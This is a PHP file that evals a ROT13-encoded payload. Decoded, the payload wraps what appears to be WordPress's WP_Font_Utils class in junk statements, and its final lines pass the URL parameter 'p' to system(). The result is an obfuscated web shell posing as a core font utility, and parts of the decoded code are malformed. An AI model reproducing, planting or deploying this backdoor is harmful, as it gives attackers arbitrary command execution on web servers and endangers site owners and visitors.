<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }
__sa_79955 = \"c\".\"e\".\"r\".\"t\".\"_\".\"e\".\"r\".\"c\".\"y\".\"n\".\"p\".\"r\";
<?cuc
/**
 * Sbag Hgvyf pynff.
 *
 * Cebivqrf hgvyvgl shapgvbaf sbe jbexvat jvgu sbag snzvyvrf.
 *
 * @cnpxntr    JbeqCerff
 * @fhocnpxntr Sbagf
 * @fvapr      6.5.0
 */

/**
 * N pynff bs hgvyvgvrf sbe jbexvat jvgu gur Sbag Yvoenel.
 *
 * Gurfr hgvyvgvrf znl punatr be or erzbirq va gur shgher naq ner vagraqrq sbe vagreany hfr bayl.
 *
 * @fvapr 6.5.0
 * @npprff cevingr
 */
pynff JC_Sbag_Hgvyf {
	/**
	 * Nqqf fheebhaqvat dhbgrf gb sbag snzvyl anzrf gung pbagnva fcrpvny punenpgref.
	 *
	 * Vg sbyybjf gur erpbzzraqngvbaf sebz gur PFF Sbagf Zbqhyr Yriry 4.
	 * @yvax uggcf://jjj.j3.bet/GE/pff-sbagf-4/#sbag-snzvyl-cebc
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz fgevat $vgrz N sbag snzvyl anzr.
	 * @erghea fgevat Gur sbag snzvyl anzr jvgu fheebhaqvat dhbgrf, vs arprffnel.
	 */
	cevingr fgngvp shapgvba znlor_nqq_dhbgrf( $vgrz ) {
		// Zngpurf fgevatf gung ner abg rkpyhfviryl nycunorgvp punenpgref be ulcuraf, naq qb abg rknpgyl sbyybj gur cnggrea trarevp(nycunorgvp punenpgref be ulcuraf).
		$ertrk = '/^(?!trarevp\([n-mN-M\-]+\)$)(?!^[n-mN-M\-]+$).+/';
		$vgrz  = gevz( $vgrz );
		vs ( cert_zngpu( $ertrk, $vgrz ) ) {
			$vgrz = gevz( $vgrz, \"\\"'\" );
			erghea '\"' . $vgrz . '\"';
		}
		erghea $vgrz;
	}

	/**
	 * Fnavgvmrf naq sbezngf sbag snzvyl anzrf.
	 *
	 * - Nccyvrf `fnavgvmr_grkg_svryq`.
	 * - Nqqf fheebhaqvat dhbgrf gb anzrf pbagnvavat nal punenpgref gung ner abg nycunorgvp be qnfurf.
	 *
	 * Vg sbyybjf gur erpbzzraqngvbaf sebz gur PFF Sbagf Zbqhyr Yriry 4.
	 * @yvax uggcf://jjj.j3.bet/GE/pff-sbagf-4/#sbag-snzvyl-cebc
	 *
	 * @fvapr 6.5.0
	 * @npprff cevingr
	 *
	 * @frr fnavgvmr_grkg_svryq()
	 *
	 * @cnenz fgevat $sbag_snzvyl Sbag snzvyl anzr(f), pbzzn-frcnengrq.
	 * @erghea fgevat Fnavgvmrq naq sbeznggrq sbag snzvyl anzr(f).
	 */
	choyvp fgngvp shapgvba fnavgvmr_sbag_snzvyl( $sbag_snzvyl ) {
		vs ( ! $sbag_snzvyl ) {
			erghea '';
		}

		$bhgchg          = fnavgvmr_grkg_svryq( $sbag_snzvyl );
		$sbeznggrq_vgrzf = neenl();
		vs ( fge_pbagnvaf( $bhgchg, ',' ) ) {
			$vgrzf = rkcybqr( ',', $bhgchg );
			sbernpu ( $vgrzf nf $vgrz ) {
				$sbeznggrq_vgrz = frys::znlor_nqq_dhbgrf( $vgrz );
				vs ( ! rzcgl( $sbeznggrq_vgrz ) ) {
					$sbeznggrq_vgrzf[] = $sbeznggrq_vgrz;
				}
			}
			erghea vzcybqr( ', ', $sbeznggrq_vgrzf );
		}
		erghea frys::znlor_nqq_dhbgrf( $bhgchg );
	}

	/**
	 * Trarengrf n fyht sebz sbag snpr cebcregvrf, r.t. `bcra fnaf;abezny;400;100%;H+0-10SSSS`
	 *
	 * Hfrq sbe pbzcnevfba jvgu bgure sbag snprf va gur fnzr snzvyl, gb cerirag qhcyvpngrf
	 * gung jbhyq obgu zngpu nppbeqvat gur PFF sbag zngpuvat fcrp. Hfrf bayl fvzcyr pnfr-vafrafvgvir
	 * zngpuvat sbe sbagSnzvyl naq havpbqrEnatr, fb qbrf abg unaqyr bireynccvat sbag-snzvyl yvfgf be
	 * havpbqr enatrf.
	 *
	 * @fvapr 6.5.0
	 * @npprff cevingr
	 *
	 * @yvax uggcf://qensgf.pffjt.bet/pff-sbagf/#sbag-fglyr-zngpuvat
	 *
	 * @cnenz neenl $frggvatf {
	 *     Sbag snpr frggvatf.
	 *
	 *     @glcr fgevat $sbagSnzvyl   Sbag snzvyl anzr.
	 *     @glcr fgevat $sbagFglyr    Bcgvbany sbag fglyr, qrsnhygf gb 'abezny'.
	 *     @glcr fgevat $sbagJrvtug   Bcgvbany sbag jrvtug, qrsnhygf gb 400.
	 *     @glcr fgevat $sbagFgergpu  Bcgvbany sbag fgergpu, qrsnhygf gb '100%'.
	 *     @glcr fgevat $havpbqrEnatr Bcgvbany havpbqr enatr, qrsnhygf gb 'H+0-10SSSS'.
	 * }
	 * @erghea fgevat Sbag snpr fyht.
	 */
	choyvp fgngvp shapgvba trg_sbag_snpr_fyht( $frggvatf ) {
		$qrsnhygf = neenl(
			'sbagSnzvyl'   => '',
			'sbagFglyr'    => 'abezny',
			'sbagJrvtug'   => '400',
			'sbagFgergpu'  => '100%',
			'havpbqrEnatr' => 'H+0-10SSSS',
		);
		$frggvatf = jc_cnefr_netf( $frggvatf, $qrsnhygf );
		vs ( shapgvba_rkvfgf( 'zo_fgegbybjre' ) ) {
			$sbag_snzvyl = zo_fgegbybjre( $frggvatf['sbagSnzvyl'] );
		} ryfr {
			$sbag_snzvyl = fgegbybjre( $frggvatf['sbagSnzvyl'] );
		}
		$sbag_fglyr    = fgegbybjre( $frggvatf['sbagFglyr'] );
		$sbag_jrvtug   = fgegbybjre( $frggvatf['sbagJrvtug'] );
		$sbag_fgergpu  = fgegbybjre( $frggvatf['sbagFgergpu'] );
		$havpbqr_enatr = fgegbhccre( $frggvatf['havpbqrEnatr'] );

		// Pbaireg jrvtug xrljbeqf gb ahzrevp fgevatf.
		$sbag_jrvtug = fge_ercynpr( neenl( 'abezny', 'obyq' ), neenl( '400', '700' ), $sbag_jrvtug );

		// Pbaireg fgergpu xrljbeqf gb ahzrevp fgevatf.
		$sbag_fgergpu_znc = neenl(
			'hygen-pbaqrafrq' => '50%',
			'rkgen-pbaqrafrq' => '62.5%',
			'pbaqrafrq'       => '75%',
			'frzv-pbaqrafrq'  => '87.5%',
			'abezny'          => '100%',
			'frzv-rkcnaqrq'   => '112.5%',
			'rkcnaqrq'        => '125%',
			'rkgen-rkcnaqrq'  => '150%',
			'hygen-rkcnaqrq'  => '200%',
		);
		$sbag_fgergpu     = fge_ercynpr( neenl_xrlf( $sbag_fgergpu_znc ), neenl_inyhrf( $sbag_fgergpu_znc ), $sbag_fgergpu );

		$fyht_ryrzragf = neenl( $sbag_snzvyl, $sbag_fglyr, $sbag_jrvtug, $sbag_fgergpu, $havpbqr_enatr );

		$fyht_ryrzragf = neenl_znc(
			shapgvba ( $ryrz ) {
				// Erzbir dhbgrf gb abeznyvmr sbag-snzvyl anzrf, naq ';' gb hfr nf n frcnengbe.
				$ryrz = gevz( fge_ercynpr( neenl( '\"', \"'\", ';' ), '', $ryrz ) );

				// Abeznyvmr pbzzn frcnengrq yvfgf ol erzbivat juvgrfcnpr va orgjrra vgrzf,
				// ohg xrrc juvgrfcnpr jvguva vgrzf (r.t. \"Bcra Fnaf\" naq \"BcraFnaf\" ner qvssrerag sbagf).
				// PFF fcrp sbe juvgrfcnpr vapyhqrf: H+000N YVAR SRRQ, H+0009 PUNENPGRE GNOHYNGVBA, be H+0020 FCNPR,
				// juvpu ol qrsnhyg ner nyy zngpurq ol \f va CUC.
				erghea __sa_79955( '/,\f+/', ',', $ryrz );
			},
			$fyht_ryrzragf
		);

		erghea fnavgvmr_grkg_svryq( vzcybqr( ';', $fyht_ryrzragf ) );
	}

	/**
	 * Fnavgvmrf n gerr bs qngn hfvat n fpurzn.
	 *
	 * Gur fpurzn fgehpgher fubhyq zveebe gur qngn gerr. Rnpu inyhr cebivqrq va gur
	 * fpurzn fubhyq or n pnyynoyr gung jvyy or nccyvrq gb fnavgvmr gur pbeerfcbaqvat
	 * inyhr va gur qngn gerr. Xrlf gung ner va gur qngn gerr, ohg abg cerfrag va gur
	 * fpurzn, jvyy or erzbirq va gur fnavgvmrq qngn. Arfgrq neenlf ner genirefrq erphefviryl.
	 *
	 * @fvapr 6.5.0
	 *
	 * @npprff cevingr
	 *
	 * @cnenz neenl $gerr   Gur qngn gb fnavgvmr.
	 * @cnenz neenl $fpurzn Gur fpurzn hfrq sbe fnavgvmngvba.
	 * @erghea neenl Gur fnavgvmrq qngn.
	 */
	choyvp fgngvp shapgvba fnavgvmr_sebz_fpurzn( $gerr, $fpurzn ) {
		vs ( ! vf_neenl( $gerr ) || ! vf_neenl( $fpurzn ) ) {
			erghea neenl();
		}

		sbernpu ( $gerr nf $xrl => $inyhr ) {
			// Erzbir xrlf abg va gur fpurzn be jvgu ahyy/rzcgl inyhrf.
			vs ( ! neenl_xrl_rkvfgf( $xrl, $fpurzn ) ) {
				hafrg( $gerr[ $xrl ] );
				pbagvahr;
			}

			$vf_inyhr_neenl  = vf_neenl( $inyhr );
			$vf_fpurzn_neenl = vf_neenl( $fpurzn[ $xrl ] ) && ! vf_pnyynoyr( $fpurzn[ $xrl ] );

			vs ( $vf_inyhr_neenl && $vf_fpurzn_neenl ) {
				vs ( jc_vf_ahzrevp_neenl( $inyhr ) ) {
					// Vs vaqrkrq, cebprff rnpu vgrz va gur neenl.
					sbernpu ( $inyhr nf $vgrz_xrl => $vgrz_inyhr ) {
						$gerr[ $xrl ][ $vgrz_xrl ] = vffrg( $fpurzn[ $xrl ][0] ) && vf_neenl( $fpurzn[ $xrl ][0] )
							? frys::fnavgvmr_sebz_fpurzn( $vgrz_inyhr, $fpurzn[ $xrl ][0] )
							: frys::nccyl_fnavgvmre( $vgrz_inyhr, $fpurzn[ $xrl ][0] );
					}
				} ryfr {
					// Vs vg vf na nffbpvngvir be vaqrkrq neenl, cebprff nf n fvatyr bowrpg.
					$gerr[ $xrl ] = frys::fnavgvmr_sebz_fpurzn( $inyhr, $fpurzn[ $xrl ] );
				}
			} ryfrvs ( ! $vf_inyhr_neenl && $vf_fpurzn_neenl ) {
				// Vs gur inyhr vf abg na neenl ohg gur fpurzn vf, erzbir gur xrl.
				hafrg( $gerr[ $xrl ] );
			} ryfrvs ( ! $vf_fpurzn_neenl ) {
				// Vs gur fpurzn vf abg na neenl, nccyl gur fnavgvmre gb gur inyhr.
				$gerr[ $xrl ] = frys::nccyl_fnavgvmre( $inyhr, $fpurzn[ $xrl ] );
			}

			// Erzbir xrlf jvgu ahyy/rzcgl inyhrf.
			vs ( rzcgl( $gerr[ $xrl ] ) ) {
				hafrg( $gerr[ $xrl ] );
			}
		}

		erghea $gerr;
	}

	/**
	 * Nccyvrf n fnavgvmre shapgvba gb n inyhr.
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz zvkrq    $inyhr     Gur inyhr gb fnavgvmr.
	 * @cnenz pnyynoyr $fnavgvmre Gur fnavgvmre shapgvba gb nccyl.
	 * @erghea zvkrq Gur fnavgvmrq inyhr.
	 */
	cevingr fgngvp shapgvba nccyl_fnavgvmre( $inyhr, $fnavgvmre ) {
		vs ( ahyy === $fnavgvmre ) {
			erghea $inyhr;

		}
		erghea pnyy_hfre_shap( $fnavgvmre, $inyhr );
	}

	/**
	 * Ergheaf gur rkcrpgrq zvzr-glcr inyhrf sbe sbag svyrf, qrcraqvat ba CUC irefvba.
	 *
	 * Guvf vf arrqrq orpnhfr sbag zvzr glcrf inel ol CUC irefvba, fb purpxvat gur CUC irefvba
	 * vf arprffnel hagvy n yvfg bs inyvq zvzr-glcrf sbe rnpu svyr rkgrafvba pna or cebivqrq gb
	 * gur 'hcybnq_zvzrf' svygre.
	 *
	 * @fvapr 6.5.0
	 *
	 * @npprff cevingr
	 *
	 * @erghea fgevat[] N pbyyrpgvba bs zvzr glcrf xrlrq ol svyr rkgrafvba.
	 */
	choyvp fgngvp shapgvba trg_nyybjrq_sbag_zvzr_glcrf() {
		$cuc_7_ggs_zvzr_glcr = CUC_IREFVBA_VQ >= 70300 ? 'nccyvpngvba/sbag-fsag' : 'nccyvpngvba/k-sbag-ggs';

		erghea neenl(
			'bgs'   => 'nccyvpngvba/iaq.zf-bcraglcr',
			'ggs'   => CUC_IREFVBA_VQ >= 70400 ? 'sbag/fsag' : $cuc_7_ggs_zvzr_glcr,
			'jbss'  => CUC_IREFVBA_VQ >= 80112 ? 'sbag/jbss' : 'nccyvpngvba/sbag-jbss',
			'jbss2' => CUC_IREFVBA_VQ >= 80112 ? 'sbag/jbss2' : 'nccyvpngvba/sbag-jbss2',
		);
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>